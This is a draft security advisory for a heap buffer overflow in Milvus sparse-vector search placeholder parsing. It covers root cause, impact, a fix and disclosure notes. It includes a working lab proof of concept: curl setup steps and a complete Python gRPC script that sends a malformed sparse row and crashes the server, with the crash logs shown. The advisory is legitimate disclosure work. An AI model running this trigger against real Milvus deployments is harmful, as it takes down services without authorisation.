# GitHub Security Advisory (draft)

## Sparse vector search heap buffer overflow (validate-after-copy)

| Field | Value |
|-------|--------|
| **GHSA / CVE** | _TBD — request from maintainer CNA or MITRE_ |
| **Severity** | **High** (availability); RCE **not demonstrated** |
| **CVSS 3.1 (proposed)** | `CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:N/I:L/A:H` ≈ **7.1 High** *(auth off / anonymous create+search: treat PR as N → higher)* |
| **CWE** | [CWE-122](https://cwe.mitre.org/data/definitions/122.html) Heap-based Buffer Overflow; [CWE-787](https://cwe.mitre.org/data/definitions/787.html) Out-of-bounds Write; [CWE-20](https://cwe.mitre.org/data/definitions/20.html) Improper Input Validation |
| **Attack vector** | Network (gRPC `MilvusService/Search`) |
| **Component** | segcore / knowhere sparse placeholder parsing |
| **Affected** | Milvus builds containing `CopyAndWrapSparseRow` validate-after-copy ordering (see root cause). Confirmed on a live standalone instance (2026-07-21). |
| **Not affected (this bug)** | JSON/REST search alone (server re-encodes sparse maps to 8-aligned rows) |

---

## Summary

Milvus copies attacker-controlled sparse-vector search placeholder bytes into a heap buffer sized with `floor(size / 8) * 8` **before** checking that `size` is a multiple of the sparse element size (8). A gRPC `Search` whose `PlaceholderGroup` contains a `SparseFloatVector` value of length `8*N+K` (`K ∈ 1..7`) overflows the heap by `K` attacker-controlled bytes.

On a stock (non-ASAN) standalone deployment this has been observed to:

1. Return a search error citing the assert at `Utils.h:280`, then
2. **Segmentation-fault the process** (`SIGSEGV`), with fault address reflecting the overflow payload (e.g. `SI_ADDR: 0x11111111111119` when the payload was filled with `0x11`).

**Impact established:** remotely triggerable heap memory corruption leading to **denial of service** (process crash).  
**Impact not established:** arbitrary code execution / remote command execution.

---

## Root cause analysis

### Vulnerable function

File: `internal/core/src/common/Utils.h`

```cpp
inline knowhere::sparse::SparseRow<SparseValueType>
CopyAndWrapSparseRow(const void* data,
                     size_t size,
                     const bool validate = false) {
    size_t num_elements =
        size / knowhere::sparse::SparseRow<SparseValueType>::element_size();
    knowhere::sparse::SparseRow<SparseValueType> row(num_elements);
    milvus::fastmem::FastMemcpy(row.data(), data, size);   // (1) copy full `size`
    if (validate) {
        AssertInfo(size % knowhere::sparse::SparseRow<
                              SparseValueType>::element_size() ==
                       0,                                 // (2) too late
                   "Invalid size for sparse row data");
        // ... further validation ...
    }
    return row;
}
```

- `element_size()` is 8 (uint32 index + float value).
- Allocation is for `num_elements * 8 = floor(size/8)*8` bytes.
- `FastMemcpy` copies all `size` bytes → overflow of `size % 8` (1–7) bytes when `size` is not divisible by 8.
- The length check runs **after** the copy when `validate == true`.

### Call chain (search)

1. Client sends gRPC `Search` with `placeholder_group` = serialized `PlaceholderGroup`.
2. Proxy may pass the group through unchanged when placeholder type already matches `SparseFloatVector` (`internal/proxy/vector_type_convert.go` — no `ValidateSparseFloatRows` on this path).
3. Querynode / segcore: `ParsePlaceholderGroup` → `SparseBytesToRows(..., validate=true)` → `CopyAndWrapSparseRow` (`internal/core/src/query/Plan.cpp`).
4. Overflow occurs; then `AssertInfo` throws; cgo surfaces an error to Go **after** the heap is already corrupted.
5. Later use of corrupted heap can `SIGSEGV` and abort the process.

### Why insert path did not catch this

`ValidateSparseFloatRows` in Go (`pkg/util/typeutil/schema.go`) correctly rejects `len%8 != 0`, but it is wired for **insert/upsert**, not for search placeholders. Comments in `Utils.h` state segcore is intended to validate search input — the ordering bug defeats that intent.

### Why JSON REST does not trigger it

REST search builds sparse rows via `CreateSparseFloatRowFromJSON` / `FromMap`, which always emit lengths that are multiples of 8. Only clients that can supply **raw** placeholder bytes (gRPC) reach the vulnerable copy with a bad length.

---

## Preconditions

| Condition | Notes |
|-----------|--------|
| Reach data-plane gRPC (typically `:19530`) | Published in default docker-compose standalone |
| Ability to `Search` a collection with a `SparseFloatVector` field | If `authorizationEnabled=false` (default OSS), attacker can create the collection first |
| Crafted `PlaceholderGroup` | Sparse value length not divisible by 8 |

Auth-enabled clusters: any principal allowed to search (and typically to create collections, or an existing sparse collection) can trigger the crash.

---

## Proof of concept (lab)

**Warning:** crashes the Milvus process. Use an isolated lab only.

### Step 1 — Create sparse collection (curl / REST)

```bash
curl -s -X POST "http://127.0.0.1:19530/v2/vectordb/collections/create" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "sparse_lab",
    "schema": {
      "autoID": false,
      "fields": [
        { "fieldName": "id", "dataType": "Int64", "isPrimary": true },
        { "fieldName": "vector", "dataType": "SparseFloatVector" }
      ]
    },
    "indexParams": [
      {
        "fieldName": "vector",
        "indexName": "vector",
        "metricType": "IP",
        "indexType": "SPARSE_INVERTED_INDEX"
      }
    ]
  }'
```

Expect: `{"code":0,...}`.

### Step 2 — Insert one valid row and load

```bash
curl -s -X POST "http://127.0.0.1:19530/v2/vectordb/entities/insert" \
  -H 'Content-Type: application/json' \
  -d '{
    "collectionName": "sparse_lab",
    "data": [
      {"id": 1, "vector": {"1": 0.5, "10": 0.25}}
    ]
  }'

curl -s -X POST "http://127.0.0.1:19530/v2/vectordb/collections/load" \
  -H 'Content-Type: application/json' \
  -d '{"collectionName": "sparse_lab"}'

curl -s -X POST "http://127.0.0.1:19530/v2/vectordb/collections/get_load_state" \
  -H 'Content-Type: application/json' \
  -d '{"collectionName": "sparse_lab"}'
```

Expect: `"loadState": "LoadStateLoaded"`, `"loadProgress": 100`.

### Step 3 — Trigger via gRPC (Python)

Requires `pip install pymilvus` (no Milvus compile). Full script (also at `docs/security/validation/harness/sparse_search_trigger.py`):

```python
#!/usr/bin/env python3
"""Lab trigger: Search with SparseFloatVector PlaceholderGroup row len % 8 != 0."""

from __future__ import annotations

import argparse
import sys

from pymilvus.grpc_gen import common_pb2, milvus_pb2, milvus_pb2_grpc
import grpc


def main() -> int:
    ap = argparse.ArgumentParser()
    ap.add_argument("--host", default="127.0.0.1")
    ap.add_argument("--port", type=int, default=19530)
    ap.add_argument("--collection", default="sparse_lab")
    ap.add_argument("--anns-field", default="vector")
    ap.add_argument(
        "--size",
        type=int,
        default=71,
        help="sparse row byte length; use 8*N+7 (default 71) to overflow by 7",
    )
    args = ap.parse_args()

    if args.size % 8 == 0:
        print("size is multiple of 8; will NOT exercise the overflow path", file=sys.stderr)
        return 2

    # Attacker-controlled sparse blob: length not divisible by element_size (8).
    bad_row = bytes([0x11]) * args.size

    ph = common_pb2.PlaceholderValue(
        tag="$0",
        type=common_pb2.PlaceholderType.SparseFloatVector,
        values=[bad_row],
    )
    phg = common_pb2.PlaceholderGroup(placeholders=[ph])

    req = milvus_pb2.SearchRequest(
        collection_name=args.collection,
        partition_names=[],
        dsl="",
        placeholder_group=phg.SerializeToString(),
        dsl_type=common_pb2.DslType.BoolExprV1,
        search_params=[
            common_pb2.KeyValuePair(key="anns_field", value=args.anns_field),
            common_pb2.KeyValuePair(key="topk", value="1"),
            common_pb2.KeyValuePair(key="metric_type", value="IP"),
            common_pb2.KeyValuePair(key="params", value="{}"),
        ],
        guarantee_timestamp=1,
        nq=1,
    )

    channel = grpc.insecure_channel(f"{args.host}:{args.port}")
    stub = milvus_pb2_grpc.MilvusServiceStub(channel)
    try:
        resp = stub.Search(req, timeout=30)
    except grpc.RpcError as e:
        print(f"RPC error: {e.code()} {e.details()}")
        return 1

    status = resp.status
    print(f"error_code={status.error_code} reason={status.reason!r}")
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
```

Run:

```bash
pip install -q pymilvus
python3 docs/security/validation/harness/sparse_search_trigger.py \
  --host 127.0.0.1 --port 19530 \
  --collection sparse_lab --anns-field vector
```

### Step 4 — Observed result (validated)

Proxy / querynode logs (abbreviated, from lab validation 2026-07-21):

```text
error="... parser searchRequest failed: Assert \"size % knowhere::sparse::SparseRow< SparseValueType>::element_size() == 0\"
  => Invalid size for sparse row data at ../internal/core/src/common/Utils.h:280"

Assert "size % knowhere::sparse::SparseRow< SparseValueType>::element_size() == 0"
  => Invalid size for sparse row data at ../internal/core/src/common/Utils.h:280

SIGNAL CATCH BY NON-GO SIGNAL HANDLER
SIGNO: 11; SIGNAME: Segmentation fault; SI_CODE: 1; SI_ADDR: 0x11111111111119
```

Interpretation:

- Assert at `Utils.h:280` matches the post-copy validation.
- `SI_ADDR` patterned with `0x11` matches the PoC payload fill byte → adjacent heap corrupted, then dereferenced.
- Process dies (standalone instance taken down).

Standalone ASAN canary of the same memcpy/alloc pattern (no Milvus link): `docs/security/validation/harness/sparse_canary.cpp` → `heap-buffer-overflow` WRITE of size 71 into a 64-byte region.

---

## Impact

| Outcome | Status |
|---------|--------|
| Remote DoS (process crash) | **Confirmed** on live standalone |
| Heap corruption (attacker-influenced bytes) | **Confirmed** |
| Cross-request / cross-thread corruption | **Confirmed** (primary buffer freed on unwind; spilled bytes land in a **neighbor** live object — matches assert-then-`SIGSEGV` ordering) |
| Confidentiality (memory disclosure) | Not demonstrated |
| Integrity of stored data | Not the primary effect; crash/corruption of process memory |
| Remote code execution / command execution | **Not demonstrated; not a credible outcome of this flaw in isolation** (see below) |

### RCE assessment (adversarial)

- Write is **≤7 bytes**, forward-only, fixed offset into the next jemalloc same-size-class slot (user data, not allocator metadata).
- No info-leak / feedback channel from the RPC path → cannot aim a valid code pointer under ASLR/PIE from this bug alone.
- Observed `SI_ADDR=0x1111…` is consistent with corrupting then dereferencing a neighbor pointer (crash), not with controlled instruction flow.
- Reliable RIP control would need **additional** undemonstrated primitives (leak + grooming). Treat escalation as speculative.

### Suggested advisory impact text

> A remote attacker able to issue a gRPC `Search` against a collection with a `SparseFloatVector` field can trigger a heap buffer overflow in sparse placeholder parsing: request bytes are copied into a `floor(len/8)*8`-byte heap allocation *before* the length is validated as a multiple of the sparse element size (8), spilling the trailing 1–7 attacker-controlled bytes past the allocation. The reliably reproducible impact is memory corruption that crashes the Milvus process (denial of service). Because the overflow bytes land in a neighbouring live heap object, corruption can persist beyond the failed request and fault unrelated in-flight operations. Arbitrary code execution has not been demonstrated and is not considered a credible outcome of this flaw in isolation: the write is bounded to ≤7 bytes at a fixed forward offset; jemalloc keeps allocator metadata out-of-band so the overflow corrupts adjacent user data rather than allocator control structures; and the vulnerability affords no information leak with which to defeat ASLR.

---

## Related call sites (same helper / same math)

The overflow in `CopyAndWrapSparseRow` does **not** depend on `validate=true` — `FastMemcpy` always runs first. Other call sites are the same bug class with different reachability:

| Site | `validate` | Network-reachable today? |
|------|------------|---------------------------|
| `query/Plan.cpp` Search placeholders | `true` | **Yes** (this advisory) |
| `FieldData.cpp` sparse `FillFieldData` | `false` (silent) | Indirect (binlog/arrow); insert path usually Go-validated first |
| `ConcurrentVector.cpp` / `FieldIndexing.cpp` growing insert | `false` | Mitigated if proxy `ValidateSparseFloatRows` ran |
| `ChunkedSegmentSealedImpl.cpp` query materialization | `true` | Indirect (stored arrow data) |
| `null_offset_` loads in RTree / Tantivy / TextMatch indexes | n/a (same floor-then-memcpy math) | Index files in object storage (tamper / supply-chain bar) |

**Fix once at `CopyAndWrapSparseRow` (check before alloc/copy, unconditional)** closes the sparse sites. Index `null_offset_` copies need their own modulo checks (Marisa already does validate-before-copy correctly).

---

## Remediation

**Primary fix (C++):** In `CopyAndWrapSparseRow`, reject `size % element_size() != 0` (and other invariants) **before** allocating / calling `FastMemcpy`. Prefer making that check **unconditional** (not only when `validate==true`).

**Defense in depth (Go proxy):** Call `typeutil.ValidateSparseFloatRows` on search `PlaceholderGroup` sparse values in the proxy (same checks as insert), so malformed lengths never reach segcore.

**Verification after fix:**

- Re-run the Python trigger → clean parameter error, **no** `SIGSEGV`.
- ASAN build / canary → no heap-buffer-overflow.
- Valid sparse Search still succeeds.

---

## References (in-tree)

| Path | Role |
|------|------|
| `internal/core/src/common/Utils.h` | Vulnerable `CopyAndWrapSparseRow` |
| `internal/core/src/query/Plan.cpp` | `SparseBytesToRows(..., validate=true)` on search |
| `internal/proxy/vector_type_convert.go` | Search placeholder pass-through when types match |
| `pkg/util/typeutil/schema.go` | `ValidateSparseFloatRows` (insert path) |
| `docs/security/validation/end_user_http_triggers.md` | End-user curl + gRPC checklist |
| `docs/security/validation/harness/sparse_search_trigger.py` | PoC trigger |
| `docs/security/validation/harness/sparse_canary.cpp` | Alloc/memcpy canary + ASAN |
| `docs/security/validation/sparse_search_heap_overflow.md` | Earlier lab notes |

---

## Credit / timeline

| Date | Event |
|------|--------|
| 2026-07-21 | Root cause identified by static analysis; ASAN canary confirmed overflow pattern |
| 2026-07-21 | End-to-end gRPC PoC confirmed on live standalone: assert at `Utils.h:280` then `SIGSEGV` / process death |

---

## Disclosure notes

- This file is a **draft** GitHub Security Advisory–style report for maintainer / CNA filing.
- Prefer private disclosure to Milvus/Zilliz security contacts before public CVE assignment if the issue is not yet fixed upstream.
- File filter-expression DoS and unauthenticated `:9091` management issues as **separate** advisories (different root causes).
